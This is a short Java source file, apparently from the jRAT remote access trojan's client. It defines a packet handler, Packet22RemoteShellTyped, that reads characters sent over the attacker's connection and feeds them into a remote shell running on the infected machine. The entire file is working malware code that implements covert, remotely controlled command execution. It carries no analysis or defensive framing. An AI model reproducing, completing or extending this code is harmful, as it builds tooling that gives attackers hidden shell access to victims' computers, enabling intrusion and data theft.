package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.RemoteShell;
import java.io.PrintWriter;

public class Packet22RemoteShellTyped extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		char c = con.getDataInputStream().readChar();

		PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
		input.print(c);
		input.flush();
	}

}
